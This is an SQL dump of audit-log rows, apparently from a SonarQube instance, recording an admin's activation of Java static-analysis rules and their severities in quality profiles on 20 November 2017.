INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1463, '2017-11-20 10:14:54.087', 'admin', 'key=java-lena-qp_15-78480:squid:S4144;ruleKey=squid:S4144;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G2HbbGRdfPp-q0a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1464, '2017-11-20 10:14:54.111', 'admin', 'key=java-lena-qp_15-78480:squid:S4165;ruleKey=squid:S4165;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G2ebbGRdfPp-q0b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1465, '2017-11-20 10:14:54.127', 'admin', 'key=java-lena-qp_15-78480:squid:S899;ruleKey=squid:S899;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G2vbbGRdfPp-q0c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1466, '2017-11-20 10:14:54.142', 'admin', 'key=java-lena-qp_15-78480:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G2-bbGRdfPp-q0d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1467, '2017-11-20 10:14:54.158', 'admin', 'key=java-lena-qp_15-78480:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G3ObbGRdfPp-q0e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1468, '2017-11-20 10:14:54.195', 'admin', 'key=java-lena-qp_15-78480:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G3zbbGRdfPp-q0f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1469, '2017-11-20 10:14:54.22', 'admin', 'key=java-lena-qp_15-78480:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G4MbbGRdfPp-q0g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1470, '2017-11-20 11:00:13.926', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe3mbbGRdfPp-q0h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1471, '2017-11-20 11:00:13.972', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe4TbbGRdfPp-q0i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1472, '2017-11-20 11:00:14.001', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe4xbbGRdfPp-q0j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1473, '2017-11-20 11:00:14.03', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe5ObbGRdfPp-q0k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1474, '2017-11-20 11:00:14.059', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe5rbbGRdfPp-q0l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1475, '2017-11-20 11:00:14.087', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe6HbbGRdfPp-q0m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1476, '2017-11-20 11:00:14.117', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe6lbbGRdfPp-q0n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1477, '2017-11-20 11:00:14.166', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe7WbbGRdfPp-q0o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1478, '2017-11-20 11:00:14.199', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe73bbGRdfPp-q0p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1479, '2017-11-20 11:00:14.228', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe8UbbGRdfPp-q0q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1480, '2017-11-20 11:00:14.254', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe8ubbGRdfPp-q0r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1481, '2017-11-20 11:00:14.273', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe9BbbGRdfPp-q0s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1482, '2017-11-20 11:00:14.307', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe9jbbGRdfPp-q0t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1483, '2017-11-20 11:00:14.348', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe-MbbGRdfPp-q0u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1484, '2017-11-20 11:00:14.385', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe-xbbGRdfPp-q0v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1485, '2017-11-20 11:00:14.414', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe_ObbGRdfPp-q0w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1486, '2017-11-20 11:00:14.438', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFe_mbbGRdfPp-q0x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1487, '2017-11-20 11:00:14.47', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfAGbbGRdfPp-q0y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1488, '2017-11-20 11:00:14.5', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfAkbbGRdfPp-q0z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1489, '2017-11-20 11:00:14.54', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfBMbbGRdfPp-q00');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1490, '2017-11-20 11:00:14.574', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfBubbGRdfPp-q01');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1491, '2017-11-20 11:00:14.597', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfCFbbGRdfPp-q02');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1492, '2017-11-20 11:00:14.627', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfCjbbGRdfPp-q03');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1493, '2017-11-20 11:00:14.646', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfC2bbGRdfPp-q04');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1494, '2017-11-20 11:00:14.677', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfDVbbGRdfPp-q05');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1495, '2017-11-20 11:00:14.706', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfDybbGRdfPp-q06');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1496, '2017-11-20 11:00:14.73', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfEKbbGRdfPp-q07');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1497, '2017-11-20 11:00:14.768', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfEwbbGRdfPp-q08');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1498, '2017-11-20 11:00:14.796', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfFMbbGRdfPp-q09');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1499, '2017-11-20 11:00:14.829', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfFtbbGRdfPp-q0-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1500, '2017-11-20 11:00:14.866', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfGSbbGRdfPp-q0_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1501, '2017-11-20 11:00:14.919', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfHHbbGRdfPp-q1A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1502, '2017-11-20 11:00:14.954', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfHqbbGRdfPp-q1B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1503, '2017-11-20 11:00:15.026', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfIybbGRdfPp-q1C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1504, '2017-11-20 11:00:15.079', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfJnbbGRdfPp-q1D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1505, '2017-11-20 11:00:15.13', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfKabbGRdfPp-q1E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1506, '2017-11-20 11:00:15.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfK_bbGRdfPp-q1F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1507, '2017-11-20 11:00:15.198', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfLebbGRdfPp-q1G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1508, '2017-11-20 11:00:15.227', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfL7bbGRdfPp-q1H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1509, '2017-11-20 11:00:15.348', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfN0bbGRdfPp-q1I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1510, '2017-11-20 11:00:15.386', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfOabbGRdfPp-q1J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1511, '2017-11-20 11:00:15.423', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfO_bbGRdfPp-q1K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1512, '2017-11-20 11:00:15.454', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfPebbGRdfPp-q1L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1513, '2017-11-20 11:00:15.472', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfPwbbGRdfPp-q1M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1514, '2017-11-20 11:00:15.518', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfQebbGRdfPp-q1N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1515, '2017-11-20 11:00:15.538', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfQybbGRdfPp-q1O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1516, '2017-11-20 11:00:15.556', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfREbbGRdfPp-q1P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1517, '2017-11-20 11:00:15.598', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfRubbGRdfPp-q1Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1518, '2017-11-20 11:00:15.635', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfSTbbGRdfPp-q1R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1519, '2017-11-20 11:00:15.674', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfS6bbGRdfPp-q1S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1520, '2017-11-20 11:00:15.703', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfTXbbGRdfPp-q1T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1521, '2017-11-20 11:00:15.731', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfTzbbGRdfPp-q1U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1522, '2017-11-20 11:00:15.77', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfUabbGRdfPp-q1V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1523, '2017-11-20 11:00:15.803', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfU7bbGRdfPp-q1W');
